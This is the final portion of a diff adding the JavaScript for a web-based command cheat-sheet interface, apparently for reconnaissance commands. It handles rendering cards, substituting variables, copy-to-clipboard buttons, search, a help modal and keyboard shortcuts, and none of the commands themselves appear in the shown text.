+    function select(){
+      document.querySelectorAll('.cheat-card').forEach(function(c){ c.classList.remove('selected'); });
+      div.classList.add('selected');
+      selectedCheat=cheat;
+      renderRightPanel(cheat);
+    }
+    div.addEventListener('click',select);
+    div.addEventListener('keydown',function(e){ if(e.key==='Enter'||e.key===' '){ e.preventDefault(); select(); } });
+    wrap.appendChild(div);
+  });
+}
+
+/* ── RIGHT PANEL ── */
+function renderRightPanel(cheat){
+  document.getElementById('rpEmpty').style.display='none';
+  var rpc=document.getElementById('rpContent');
+  rpc.style.display='flex';
+  var catInfo=CATS.find(function(c){ return c.id===cheat.cat; });
+  var catLabel=catInfo?catInfo.label:cheat.cat;
+  var words=cheat.title.split(' ');
+  document.getElementById('rpTitle').innerHTML=words.slice(0,-1).join(' ')+' <span>'+words.slice(-1)+'</span>';
+  document.getElementById('rpInfo').innerHTML=''
+    +'<div class="rp-info-title">'+cheat.title+'</div>'
+    +'<div class="rp-info-desc">'+cheat.desc+'</div>'
+    +'<div class="rp-info-tags">'
+    +'<span style="font-family:\'JetBrains Mono\',monospace;font-size:9px;padding:1px 7px;background:rgba(255,255,255,.04);color:var(--muted);border:1px solid var(--border);border-radius:3px">'+catLabel+'</span>'
+    +cheat.tags.map(function(t){ return '<span class="cc-tag tag-'+t+'">'+t+'</span>'; }).join('')
+    +'</div>';
+  var varWrap=document.getElementById('rpVariants');
+  varWrap.innerHTML='';
+  cheat.variants.forEach(function(variant,vi){
+    var block=document.createElement('div');
+    block.className='variant-block';
+    block.innerHTML='<div class="vb-label-row">'
+      +'<span class="vb-name">'+variant.name+'</span>'
+      +'<div class="vb-actions">'
+      +'<button class="vb-copy-btn" data-vi="'+vi+'" aria-label="Copy command">Copy</button>'
+      +'<button class="vb-enter-btn" data-vi="'+vi+'" aria-label="Copy command with enter">Copy+Enter</button>'
+      +'</div></div>'
+      +'<div class="cmd-block" tabindex="0" data-vi="'+vi+'" role="button" aria-label="Click to copy: '+variant.name+'">'+highlightCmd(variant.cmd)+'</div>';
+    varWrap.appendChild(block);
+    block.querySelectorAll('[data-vi]').forEach(function(btn){
+      btn.addEventListener('click',function(e){
+        e.stopPropagation();
+        var cmd=subVars(variant.cmd);
+        var withEnter=btn.classList.contains('vb-enter-btn');
+        navigator.clipboard.writeText(cmd+(withEnter?'\n':'')).then(function(){
+          showToast('Copied'+(withEnter?' + Enter':'')+'!');
+          if(btn.classList.contains('vb-copy-btn')){ btn.textContent='Copied!'; btn.classList.add('copied'); setTimeout(function(){ btn.textContent='Copy'; btn.classList.remove('copied'); },1500); }
+        }).catch(function(){ showToast('Copy failed'); });
+      });
+      if(btn.classList.contains('cmd-block')){
+        btn.addEventListener('keydown',function(e){ if(e.key==='Enter'||e.key===' '){ e.preventDefault(); btn.click(); } });
+      }
+    });
+  });
+}
+
+/* ── SEARCH ── */
+document.getElementById('searchInput').addEventListener('input',function(){ activeSearch=this.value.trim(); renderCards(); });
+
+/* ── SIDEBAR ALL ── */
+var catAll=document.getElementById('cat-all');
+function activateAll(){ setCategory('all','All Cheats'); }
+catAll.addEventListener('click',activateAll);
+catAll.addEventListener('keydown',function(e){ if(e.key==='Enter'||e.key===' '){ e.preventDefault(); activateAll(); } });
+
+/* ── CLEAR VARS ── */
+function clearVars(){
+  Object.keys(VARS).forEach(function(k){ VARS[k]=''; var el=document.getElementById('v_'+k); if(el) el.value=''; });
+  if(selectedCheat) renderRightPanel(selectedCheat);
+  showToast('Variables cleared');
+}
+document.getElementById('clearVarsBtn').addEventListener('click',clearVars);
+document.getElementById('clearGlobalsBtn').addEventListener('click',clearVars);
+
+/* ── CLOSE RIGHT PANEL ── */
+document.getElementById('rpClose').addEventListener('click',function(){
+  selectedCheat=null;
+  document.getElementById('rpContent').style.display='none';
+  document.getElementById('rpEmpty').style.display='flex';
+  document.querySelectorAll('.cheat-card').forEach(function(c){ c.classList.remove('selected'); });
+});
+
+/* ── MODAL ── */
+function openHelp(){ document.getElementById('instructionsModal').classList.add('show'); }
+function closeHelp(){ document.getElementById('instructionsModal').classList.remove('show'); }
+document.getElementById('helpBtn').addEventListener('click',openHelp);
+document.getElementById('helpBtn2').addEventListener('click',openHelp);
+document.getElementById('modalClose').addEventListener('click',closeHelp);
+document.getElementById('instructionsModal').addEventListener('click',function(e){ if(e.target===this) closeHelp(); });
+
+/* ── KEYBOARD SHORTCUTS ── */
+document.addEventListener('keydown',function(e){
+  var tag=document.activeElement.tagName;
+  if(e.key==='?'&&!['INPUT','TEXTAREA'].includes(tag)){ openHelp(); return; }
+  if((e.ctrlKey||e.metaKey)&&e.key==='k'){ e.preventDefault(); document.getElementById('searchInput').focus(); return; }
+  if(e.key==='Escape'){
+    if(document.getElementById('instructionsModal').classList.contains('show')){ closeHelp(); return; }
+    selectedCheat=null;
+    document.getElementById('rpContent').style.display='none';
+    document.getElementById('rpEmpty').style.display='flex';
+    document.querySelectorAll('.cheat-card').forEach(function(c){ c.classList.remove('selected'); });
+  }
+});
+
+/* ── INIT ── */
+buildSidebar();
+buildTagFilters();
+renderCards();
+
+if(!localStorage.getItem('recon_arsenal_visited')){
+  setTimeout(openHelp,600);
+  localStorage.setItem('recon_arsenal_visited','1');
+}
+
+})();
+</script>
+<script>
+/* ── LAYOUT SYNC: keep app-shell offset matched to var-bar's real (now wrap-capable) height ── */
+(function(){
+  function sync(){
+    var shell=document.querySelector('.app-shell'),bar=document.querySelector('.var-bar');
+    if(!shell)return;
+    if(!bar||getComputedStyle(bar).display==='none'){shell.style.marginTop='';shell.style.height='';shell.style.minHeight='';return;}
+    var offset=Math.round(bar.getBoundingClientRect().bottom);
+    shell.style.marginTop=offset+'px';
+    if(window.innerWidth<=900){
+      shell.style.height='auto';
+      shell.style.minHeight='calc(100vh - '+offset+'px)';
+    }else{
+      shell.style.height='calc(100vh - '+offset+'px)';
+      shell.style.minHeight='';
+    }
+  }
+  window.addEventListener('resize',sync);
+  window.addEventListener('load',sync);
+  document.addEventListener('DOMContentLoaded',sync);
+  var bar=document.querySelector('.var-bar');
+  if(bar)bar.addEventListener('input',sync);
+  sync();
+})();
+</script>
+</body>
+</html>
